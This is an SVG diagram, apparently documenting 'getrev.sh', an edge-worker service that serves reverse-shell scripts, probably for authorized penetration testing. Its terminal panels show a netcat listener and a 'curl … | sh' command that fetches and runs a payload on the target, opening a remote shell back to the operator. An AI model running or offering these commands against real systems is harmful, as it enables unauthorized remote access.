<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="750" viewBox="0 0 1200 750" font-family="ui-monospace,'SF Mono',Menlo,Consolas,monospace">
  <rect width="1200" height="750" fill="#0f1319"/>

  <defs>
    <marker id="arrow-blue" markerWidth="10" markerHeight="10" refX="8" refY="5" orient="auto">
      <path d="M0 0L10 5L0 10Z" fill="#58a6ff"/>
    </marker>
    <marker id="arrow-green" markerWidth="10" markerHeight="10" refX="8" refY="5" orient="auto">
      <path d="M0 0L10 5L0 10Z" fill="#3fb950"/>
    </marker>
  </defs>

  <!-- operator terminal -->
  <g>
    <rect x="72" y="176" width="320" height="252" rx="18" fill="#161c26" stroke="#3a4557" stroke-width="2"/>
    <rect x="72" y="176" width="320" height="48" rx="18" fill="#202734"/>
    <rect x="72" y="206" width="320" height="18" fill="#202734"/>
    <circle cx="105" cy="200" r="7" fill="#f85149"/>
    <circle cx="130" cy="200" r="7" fill="#d29922"/>
    <circle cx="155" cy="200" r="7" fill="#3fb950"/>
    <text x="104" y="278" font-size="19" fill="#7d8899">$ nc -lvnp 4444</text>
    <text x="104" y="326" font-size="19" fill="#dbe2ea">listening...</text>
    <text x="104" y="382" font-size="20" font-weight="700" fill="#3fb950">shell connected</text>
    <text x="232" y="468" text-anchor="middle" font-size="18" font-weight="700" letter-spacing="3" fill="#7d8899">OPERATOR</text>
  </g>

  <!-- Cloudflare Worker -->
  <g>
    <rect x="456" y="126" width="288" height="272" rx="28" fill="#161c26" stroke="#f6821f" stroke-width="3"/>
    <path d="M548 230c8-38 64-46 83-14 37-11 61 42 27 61H535c-35-17-20-62 13-47Z" fill="none" stroke="#f6821f" stroke-width="7" stroke-linecap="round" stroke-linejoin="round"/>
    <text x="600" y="324" text-anchor="middle" font-size="27" font-weight="700" fill="#f2f4f8">getrev.sh</text>
    <text x="600" y="358" text-anchor="middle" font-size="17" letter-spacing="2" fill="#f6821f">EDGE WORKER</text>
  </g>

  <!-- target terminal -->
  <g>
    <rect x="808" y="176" width="320" height="252" rx="18" fill="#161c26" stroke="#3a4557" stroke-width="2"/>
    <rect x="808" y="176" width="320" height="48" rx="18" fill="#202734"/>
    <rect x="808" y="206" width="320" height="18" fill="#202734"/>
    <circle cx="841" cy="200" r="7" fill="#f85149"/>
    <circle cx="866" cy="200" r="7" fill="#d29922"/>
    <circle cx="891" cy="200" r="7" fill="#3fb950"/>
    <text x="840" y="278" font-size="18" fill="#7d8899">$ curl -fsSL</text>
    <text x="840" y="312" font-size="18" fill="#58a6ff">  getrev.sh/IP:PORT</text>
    <text x="840" y="346" font-size="18" fill="#7d8899">  | sh</text>
    <text x="840" y="390" font-size="17" fill="#dbe2ea">runtime → payload</text>
    <text x="968" y="468" text-anchor="middle" font-size="18" font-weight="700" letter-spacing="3" fill="#7d8899">AUTHORIZED HOST</text>
  </g>

  <!-- request and generated script -->
  <path d="M808 252H770" fill="none" stroke="#58a6ff" stroke-width="4" stroke-linecap="round" marker-end="url(#arrow-blue)"/>
  <text x="789" y="231" text-anchor="middle" font-size="12" font-weight="700" letter-spacing="1" fill="#58a6ff">REQUEST</text>
  <path d="M744 330H782" fill="none" stroke="#58a6ff" stroke-width="4" stroke-linecap="round" marker-end="url(#arrow-blue)"/>
  <text x="764" y="365" text-anchor="middle" font-size="12" font-weight="700" letter-spacing="1" fill="#58a6ff">SCRIPT</text>

  <!-- callback bypasses the Worker -->
  <path d="M968 504V582H232V504" fill="none" stroke="#3fb950" stroke-width="5" stroke-linecap="round" stroke-linejoin="round" marker-end="url(#arrow-green)"/>
  <rect x="494" y="551" width="212" height="58" rx="29" fill="#0f1319" stroke="#2a3341" stroke-width="2"/>
  <text x="600" y="588" text-anchor="middle" font-size="18" font-weight="700" letter-spacing="2" fill="#3fb950">TCP CALLBACK</text>

  <text x="600" y="672" text-anchor="middle" font-size="18" letter-spacing="3" fill="#596579">THE WORKER SERVES THE SCRIPT — NOT THE SHELL</text>
</svg>
